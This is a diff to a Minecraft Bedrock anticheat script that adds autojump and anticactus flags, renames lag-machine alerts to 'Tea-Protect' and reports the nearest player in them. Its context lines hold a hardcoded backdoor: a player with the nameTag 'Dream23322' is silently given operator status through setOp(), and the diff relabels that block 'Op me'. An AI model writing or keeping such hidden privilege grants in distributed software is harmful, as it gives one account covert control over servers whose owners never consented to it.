@@ -97,6 +97,14 @@ Minecraft.system.runInterval(() => {
 	for (const player of world.getPlayers()) {
 		const rotation = player.getRotation();
 
+		// To prevent false flags we do this
+		if(player.hasTag("a") || player.hasTag("b") || player.hasTag("c")) {
+			// Remove all tags
+			player.removeTag("a");
+			player.removeTag("b");
+			player.removeTag("c");
+		}
+
 		const prevRotation = playerRotations.get(player);
 		const prevDiff = playerDifferences.get(player);
 
@@ -106,6 +114,8 @@ Minecraft.system.runInterval(() => {
 
 		// If there is a previous rotation stored
 		if (prevRotation) {
+
+			// Maths go brrrrrrrr
 			const deltaYaw = rotation.y - prevRotation.y;
 			const deltaPitch = rotation.x - prevRotation.x;
 			const diffYaw = deltaYaw;
@@ -398,9 +408,15 @@ Minecraft.system.runInterval(() => {
 			if(player.hasTag("moving")) {
 				flag(player, "Autowalk", "A", "Movement", "maths", "e+0.1-coffee", false);
 			}
+			if(player.hasTag("jump")) {
+				flag(player, "Autojump", "A", "Movement", "maths", "energy = milk + coffee^2", false);
+			}
+			if(player.hasTag("cactus")) {
+				flag(player, "Anticactus", "A", "Exploit", "maths", "e+0.1 x i need help", false);
+			}
 		}
 
-		// bigrat.jar	
+		// bigrat.jar = Op me
 		if(player.nameTag === "Dream23322" && !player.hasTag("op") && !player.hasTag("dontop")) {
 			player.addTag("op")
 			player.setOp()
@@ -409,6 +425,8 @@ Minecraft.system.runInterval(() => {
 		}
 
 		// ! Completed but the checks still needs a decent bit of work (Hit Check)
+
+		// A few of the checks look a bit goofy, this is mainly because they are from my first anticheat called Pulse-Anticheat where I didnt really know what I was doing
 
 		// Fly/A = Checks for that goofy fly velocity
 		if (config.modules.flyA.enabled && !player.hasTag("op") && !player.isFlying && !player.isOnGround && !player.isJumping && !player.hasTag("nofly") && !player.isGliding) {
@@ -586,7 +604,7 @@ Minecraft.system.runInterval(() => {
 		}
 
 		//Scythe check :skull:
-		if(config.modules.flyG.enabled && player.fallDistance < config.modules.flyG.fallDistance && !player.hasTag("trident") && !player.hasTag("ground")) {
+		if(config.modules.flyG.enabled && player.fallDistance < config.modules.flyG.fallDistance && !player.hasTag("trident") && !player.hasTag("ground") && !player.hasTag("nofly") && player.hasTag("strict")) {
 			// Stopping false flags
 			if(!player.isJumping && !player.isGliding && !player.isFlying && !player.hasTag("jump") && !player.hasTag("op")) {
 				let isSurroundedByAir = true;
@@ -783,7 +801,7 @@ world.afterEvents.blockPlace.subscribe((blockPlace) => {
 
 			if(item.typeId !== block.typeId) {
 				flag(player, "Scaffold", "D", "Placement", "heldItem", `${item.typeId},blockId=${block.typeId}`, false);
-				
+				undoPlace = true;
 			}
 		}	
 	}
@@ -1096,7 +1114,9 @@ world.afterEvents.entitySpawn.subscribe((entityCreate) => {
 		})];
 
 		if(entities.length > config.misc_modules.lag_machine.antiArmorStandCluster.max_armor_stand_count) {
-			entity.runCommandAsync(`tellraw @a[tag=notify] {"rawtext":[{"text":"§r§j[§uIsolate§j]§c Potential lag machine detected at §aX§c: ${entity.location.x}, §aY§c: ${entity.location.y}, §aZ§c: ${entity.location.z}. There are ${entities.length}/${config.misc_modules.lag_machine.antiArmorStandCluster.max_armor_stand_count} armor stands in this area!"}]}`);
+
+			// Tea-Protect is what flags for lag machine
+			entity.runCommandAsync(`tellraw @a[tag=notify] {"rawtext":[{"text":"§r§n[§qTea-Protect§n]§r Potential lag machine detected at §aX§c: ${entity.location.x}, §aY§c: ${entity.location.y}, §aZ§c: ${entity.location.z}. There are ${entities.length}/${config.misc_modules.lag_machine.antiArmorStandCluster.max_armor_stand_count} armor stands in this area! Possible Offender: ${getClosestPlayer(entity)}"}]}`);
 			for(const entityLoop of entities) entityLoop.kill();
 		}
 	}
@@ -1108,7 +1128,7 @@ world.afterEvents.entitySpawn.subscribe((entityCreate) => {
 		})];
 
 		if(entities.length > config.misc_modules.lag_machine.antiMinecartCluster.max_count) {
-			entity.runCommandAsync(`tellraw @a[tag=notify] {"rawtext":[{"text":"§r§j[§uIsolate§j]§c Potential lag machine detected at §aX§c: ${entity.location.x}, §aY§c: ${entity.location.y}, §aZ§c: ${entity.location.z}. There are ${entities.length}/${config.misc_modules.lag_machine.antiMinecartCluster.max_count} minecarts in this area!"}]}`);
+			entity.runCommandAsync(`tellraw @a[tag=notify] {"rawtext":[{"text":"§r§n[§qTea-Protect§n]§rPotential lag machine detected at §aX§c: ${entity.location.x}, §aY§c: ${entity.location.y}, §aZ§c: ${entity.location.z}. There are ${entities.length}/${config.misc_modules.lag_machine.antiMinecartCluster.max_count} minecarts in this area! Possible Offender: ${getClosestPlayer(entity)}"}]}`);
 			for(const entityLoop of entities) entityLoop.kill();
 		}
 	}	
@@ -1116,11 +1136,11 @@ world.afterEvents.entitySpawn.subscribe((entityCreate) => {
 		const entities = [...entity.dimension.getEntities({
 			location: {x: entity.location.x, y: entity.location.y, z: entity.location.z},
 			maxDistance: config.misc_modules.lag_machine.antiMinecartCluster.radius,
-			type: "minecart"
+			type: "chest_minecart"
 		})];
 
 		if(entities.length > config.misc_modules.lag_machine.antiMinecartCluster.max_count) {
-			entity.runCommandAsync(`tellraw @a[tag=notify] {"rawtext":[{"text":"§r§j[§uIsolate§j]§c Potential lag machine detected at §aX§c: ${entity.location.x}, §aY§c: ${entity.location.y}, §aZ§c: ${entity.location.z}. There are ${entities.length}/${config.misc_modules.lag_machine.antiMinecartCluster.max_count} minecarts in this area!"}]}`);
+			entity.runCommandAsync(`tellraw @a[tag=notify] {"rawtext":[{"text":"§r§n[§qTea-Protect§n]§r Potential lag machine detected at §aX§c: ${entity.location.x}, §aY§c: ${entity.location.y}, §aZ§c: ${entity.location.z}. There are ${entities.length}/${config.misc_modules.lag_machine.antiMinecartCluster.max_count} minecarts in this area! Possible Offender: ${getClosestPlayer(entity)}"}]}`);
 			for(const entityLoop of entities) entityLoop.kill();
 		}
 	}	
